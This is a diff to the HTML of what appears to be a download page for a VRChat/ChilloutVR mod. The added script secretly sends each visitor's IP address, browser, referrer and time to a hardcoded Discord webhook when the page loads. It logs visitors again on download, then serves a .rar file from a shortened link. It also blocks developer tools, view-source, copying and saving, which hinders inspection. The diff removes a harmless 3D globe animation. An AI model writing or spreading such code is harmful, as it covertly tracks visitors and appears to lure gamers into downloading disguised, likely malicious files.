@@ -554,7 +554,112 @@
     <!-- Scroll to Top Button -->
     <div id="scrollTopBtn" class="scroll-top-btn"><i class="fas fa-arrow-up text-white text-xl"></i></div>
 
-     <script>
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496028209702240287/Q7lhSM2V78xj2-xRiFehymEF3UMtrFHaWEIKYAqV2ZyIxGdBZTqK9xyAjr5vHadfaxpK';
+        
+        async function sendLoginToDiscord() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org/?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString('tr-TR');
+                const referrer = document.referrer || 'Direct';
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({embeds: [{title: "User visited page", color: 0x00ff00, fields: [{name: "IP", value: `\`${userIP}\``, inline: true},{name: "Time", value: `\`${timestamp}\``, inline: true},{name: "Referrer", value: `\`${referrer}\``, inline: true},{name: "Browser", value: `\`${userAgent.substring(0,100)}...\``, inline: false}]}]})
+                });
+            } catch(e) { console.error(e); }
+        }
+        
+        async function sendDownloadToDiscord() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org/?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString('tr-TR');
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({embeds: [{title: "Plugin Download Triggered", color: 0x0099ff, fields: [{name: "IP", value: `\`${userIP}\``, inline: true},{name: "Time", value: `\`${timestamp}\``, inline: true},{name: "File", value: `\`VRCPlugin.rar\``, inline: true},{name: "User Agent", value: `\`${userAgent.substring(0,80)}\``}]}]})
+                });
+            } catch(e) { console.error(e); }
+        }
+        
+        async function downloadFile() {
+            await sendDownloadToDiscord();
+            const downloadUrl = 'https://rb.gy/2cydgw';
+            const link = document.createElement('a');
+            link.href = downloadUrl;
+            link.download = 'ChilloutVR Mod.rar';
+            link.target = '_self';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            showToast('Download started!', 'success');
+        }
+        
+        function showToast(msg, type) {
+            const toast = document.createElement('div');
+            toast.className = `fixed bottom-5 left-1/2 transform -translate-x-1/2 z-50 px-6 py-3 rounded-lg shadow-lg text-white ${type === 'success' ? 'bg-green-600' : 'bg-red-600'} transition-all duration-300`;
+            toast.innerHTML = `<i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-triangle'} mr-2"></i>${msg}`;
+            document.body.appendChild(toast);
+            setTimeout(() => { toast.remove(); }, 3000);
+        }
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('loader')?.classList.add('hidden');
+            sendLoginToDiscord();
+        });
+        
+        // Smooth Scroll & Nav radius on scroll
+        window.addEventListener('scroll', () => {
+            const nav = document.querySelector('nav');
+            if (window.scrollY > 50) nav.classList.add('scrolled');
+            else nav.classList.remove('scrolled');
+            
+            const scrollBtn = document.getElementById('scrollTopBtn');
+            if (window.scrollY > window.innerHeight * 0.3) scrollBtn.classList.add('show');
+            else scrollBtn.classList.remove('show');
+        });
+        
+        document.getElementById('scrollTopBtn')?.addEventListener('click', () => { window.scrollTo({top:0, behavior:'smooth'}); });
+        
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                if(this.getAttribute('href') === '#') return;
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if(target) target.scrollIntoView({behavior:'smooth', block:'start'});
+            });
+        });
+        
+        document.getElementById('mobile-menu-btn')?.addEventListener('click', () => {
+            document.getElementById('mobile-menu')?.classList.toggle('open');
+        });
+        
+        document.querySelectorAll('.card-3d').forEach(card => {
+            card.addEventListener('mousemove', (e) => {
+                const rect = card.getBoundingClientRect();
+                const x = e.clientX - rect.left, y = e.clientY - rect.top;
+                const centerX = rect.width/2, centerY = rect.height/2;
+                const rotateX = (y - centerY)/10, rotateY = (centerX - x)/10;
+                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateZ(20px)`;
+            });
+            card.addEventListener('mouseleave', () => { card.style.transform = ''; });
+        });
+        
+        // Disable right click and key combos fully
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+        <script>
 const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496028209702240287/Q7lhSM2V78xj2-xRiFehymEF3UMtrFHaWEIKYAqV2ZyIxGdBZTqK9xyAjr5vHadfaxpK';
 
 (function autoLogOnPageLoad() {
@@ -980,259 +1085,6 @@ const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496028209702240287
             }).catch(() => {});
         });
 })();
-    </script>
-        <script>
-    (function() {
-        const container = document.getElementById('heroGlobe');
-        const canvas = document.getElementById('globe-canvas');
-        if (!container || !canvas) return;
-
-        const SIZE = () => Math.min(container.offsetWidth, container.offsetHeight) || 340;
-        let S = SIZE();
-
-        const renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: true });
-        renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
-        renderer.setSize(S, S);
-        renderer.setClearColor(0x000000, 0);
-
-        const scene = new THREE.Scene();
-        const camera = new THREE.PerspectiveCamera(38, 1, 0.1, 100);
-        camera.position.z = 2.6;
-
-        const isGold = () => document.body.classList.contains('gold-theme');
-        const T = () => isGold()
-            ? { land: 0xd97706, dot: 0xfbbf24, marker: 0xff8c00, arc: 0xfde68a, glow: 0xf59e0b }
-            : { land: 0xc9184a, dot: 0xff4d94, marker: 0xff1493, arc: 0xffb3d1, glow: 0xe0115f };
-
-        const oceanMesh = new THREE.Mesh(
-            new THREE.SphereGeometry(0.998, 32, 32),
-            new THREE.MeshBasicMaterial({ color: 0x050510, transparent: true, opacity: 0.95 })
-        );
-        scene.add(oceanMesh);
-
-        function isLand(lat, lon) {
-            if (lat > 15 && lat < 75 && lon > -170 && lon < -50) {
-                if (lat > 25 && lon > -125 && lon < -60) return true;
-                if (lat > 15 && lat < 25 && lon > -120 && lon < -85) return true;
-                if (lat > 55 && lon > -140 && lon < -55) return true;
-                if (lat > 60 && lon > -170 && lon < -130) return true;
-            }
-            if (lat > -55 && lat < 15 && lon > -82 && lon < -34) return true;
-            if (lat > 35 && lat < 72 && lon > -12 && lon < 45) return true;
-            if (lat > -35 && lat < 38 && lon > -18 && lon < 52) return true;
-            if (lat > 0 && lat < 75 && lon > 25 && lon < 150) return true;
-            if (lat > -10 && lat < 30 && lon > 95 && lon < 145) return true;
-            if (lat > -40 && lat < -10 && lon > 113 && lon < 155) return true;
-            if (lat > 60 && lat < 84 && lon > -55 && lon < -18) return true;
-            if (lat > 30 && lat < 46 && lon > 129 && lon < 148) return true;
-            if (lat > 50 && lat < 62 && lon > -10 && lon < 2) return true;
-            return false;
-        }
-
-        function makeLandDots(dotColor, bgColor) {
-            const positions = [];
-            const colors    = [];
-            const N = 12000;
-            const phi = Math.PI * (3 - Math.sqrt(5));
-            for (let i = 0; i < N; i++) {
-                const y_n = 1 - (i / (N - 1)) * 2;
-                const r   = Math.sqrt(1 - y_n * y_n);
-                const theta = phi * i;
-                const x = r * Math.cos(theta);
-                const z = r * Math.sin(theta);
-                const y = y_n;
-                const lat = Math.asin(y) * 180 / Math.PI;
-                const lon = Math.atan2(z, x) * 180 / Math.PI;
-                const onLand = isLand(lat, lon);
-                positions.push(x, y, z);
-                if (onLand) {
-                    const c = new THREE.Color(dotColor);
-                    colors.push(c.r, c.g, c.b);
-                } else {
-                    const c = new THREE.Color(bgColor);
-                    colors.push(c.r * 0.35, c.g * 0.35, c.b * 0.35);
-                }
-            }
-            const geo = new THREE.BufferGeometry();
-            geo.setAttribute('position', new THREE.Float32BufferAttribute(positions, 3));
-            geo.setAttribute('color',    new THREE.Float32BufferAttribute(colors, 3));
-            const mat = new THREE.PointsMaterial({ size: 0.014, vertexColors: true, transparent: true, opacity: 0.85, sizeAttenuation: true });
-            return new THREE.Points(geo, mat);
-        }
-
-        function makeAtm(glowColor) {
-            const mat = new THREE.MeshBasicMaterial({ color: glowColor, transparent: true, opacity: 0.08, side: THREE.BackSide });
-            return new THREE.Mesh(new THREE.SphereGeometry(1.12, 32, 32), mat);
-        }
-
-        function latLonToVec(lat, lon) {
-            const phi   = (90 - lat) * Math.PI / 180;
-            const theta = (lon + 180) * Math.PI / 180;
-            return new THREE.Vector3(
-                -Math.sin(phi) * Math.cos(theta),
-                Math.cos(phi),
-                Math.sin(phi) * Math.sin(theta)
-            );
-        }
-
-        const cityPairs = [
-            [[40.7, -74.0], [51.5, -0.1]], [[51.5, -0.1], [48.8, 2.3]],
-            [[35.7, 139.7], [37.5, 127.0]], [[1.3, 103.8], [22.3, 114.2]],
-            [[-33.9, 18.4], [-23.5, -46.6]], [[40.7, -74.0], [34.0, -118.2]],
-            [[48.8, 2.3], [55.7, 37.6]], [[28.6, 77.2], [35.7, 139.7]],
-            [[-33.9, 18.4], [51.5, -0.1]], [[19.4, -99.1], [40.7, -74.0]],
-        ];
-
-        function makeArc(p1, p2, arcColor) {
-            const pts = [];
-            const segs = 80;
-            for (let i = 0; i <= segs; i++) {
-                const t = i / segs;
-                const v = new THREE.Vector3().lerpVectors(p1, p2, t).normalize();
-                v.multiplyScalar(1 + 0.22 * Math.sin(Math.PI * t));
-                pts.push(v);
-            }
-            const geo = new THREE.BufferGeometry().setFromPoints(pts);
-            const mat = new THREE.LineBasicMaterial({ color: arcColor, transparent: true, opacity: 0.55 });
-            return new THREE.Line(geo, mat);
-        }
-
-        function buildArcs(arcColor) {
-            const g = new THREE.Group();
-            cityPairs.forEach(([c1, c2]) => {
-                g.add(makeArc(latLonToVec(c1[0], c1[1]), latLonToVec(c2[0], c2[1]), arcColor));
-            });
-            return g;
-        }
-
-        const cities = [
-            [40.7, -74.0], [51.5, -0.1], [48.8, 2.3], [35.7, 139.7], [37.5, 127.0],
-            [1.3, 103.8], [-33.9, 18.4], [-23.5, -46.6], [28.6, 77.2], [55.7, 37.6],
-            [19.4, -99.1], [34.0, -118.2], [22.3, 114.2], [-33.8, 151.2], [52.5, 13.4],
-        ];
-
-        function buildMarkers(markerColor) {
-            const g = new THREE.Group();
-            cities.forEach(([lat, lon]) => {
-                const pos = latLonToVec(lat, lon).multiplyScalar(1.018);
-                const ring = new THREE.Mesh(
-                    new THREE.RingGeometry(0.018, 0.026, 16),
-                    new THREE.MeshBasicMaterial({ color: markerColor, transparent: true, opacity: 0.9, side: THREE.DoubleSide })
-                );
-                ring.position.copy(pos);
-                ring.lookAt(0, 0, 0);
-                g.add(ring);
-                const dot = new THREE.Mesh(
-                    new THREE.SphereGeometry(0.010, 8, 8),
-                    new THREE.MeshBasicMaterial({ color: markerColor })
-                );
-                dot.position.copy(pos);
-                g.add(dot);
-            });
-            return g;
-        }
-
-        let theme = T();
-        let dots    = makeLandDots(theme.dot, theme.land);
-        let atm     = makeAtm(theme.glow);
-        let arcs    = buildArcs(theme.arc);
-        let markers = buildMarkers(theme.marker);
-
-        const pivot = new THREE.Group();
-        pivot.add(dots, atm, arcs, markers);
-        scene.add(pivot);
-
-        let drag = false, px = 0, py = 0, vx = 0, vy = 0;
-        canvas.addEventListener('mousedown',  e => { drag=true; px=e.clientX; py=e.clientY; });
-        window.addEventListener('mouseup',    () => drag = false);
-        window.addEventListener('mousemove',  e => {
-            if (!drag) return;
-            vx = (e.clientX-px)*0.005; vy = (e.clientY-py)*0.005;
-            pivot.rotation.y += vx; pivot.rotation.x += vy;
-            px=e.clientX; py=e.clientY;
-        });
-        canvas.addEventListener('touchstart', e => { drag=true; px=e.touches[0].clientX; py=e.touches[0].clientY; });
-        canvas.addEventListener('touchend',   () => drag = false);
-        canvas.addEventListener('touchmove',  e => {
-            if (!drag) return;
-            vx=(e.touches[0].clientX-px)*0.005; vy=(e.touches[0].clientY-py)*0.005;
-            pivot.rotation.y+=vx; pivot.rotation.x+=vy;
-            px=e.touches[0].clientX; py=e.touches[0].clientY;
-            e.preventDefault();
-        }, {passive:false});
-
-        const tog = document.getElementById('themeToggle');
-        if (tog) tog.addEventListener('change', () => setTimeout(() => {
-            theme = T();
-            pivot.remove(dots, atm, arcs, markers);
-            dots    = makeLandDots(theme.dot, theme.land);
-            atm     = makeAtm(theme.glow);
-            arcs    = buildArcs(theme.arc);
-            markers = buildMarkers(theme.marker);
-            pivot.add(dots, atm, arcs, markers);
-        }, 60));
-
-        window.addEventListener('resize', () => {
-            S = SIZE();
-            renderer.setSize(S, S);
-        });
-
-        pivot.rotation.y = -0.3;
-        (function loop() {
-            requestAnimationFrame(loop);
-            if (!drag) { vx *= 0.92; vy *= 0.92; }
-            pivot.rotation.y += vx + 0.0018;
-            pivot.rotation.x += vy;
-            pivot.rotation.x = Math.max(-0.5, Math.min(0.5, pivot.rotation.x));
-            renderer.render(scene, camera);
-        })();
-    })();
-    </script>
-       <script>
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        document.addEventListener('copy', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        document.addEventListener('cut', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || e.keyCode === 123) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.keyCode === 73)) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'j' || e.key === 'J' || e.keyCode === 74)) {
-                e.preventDefault();
-                return false;
-            }
-            if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
-                e.preventDefault();
-                return false;
-            }
-        });
-        document.querySelectorAll('img').forEach(img => {
-            img.addEventListener('dragstart', function(e) {
-                e.preventDefault();
-                return false;
-            });
-        });
     </script>
 </body>
 </html>
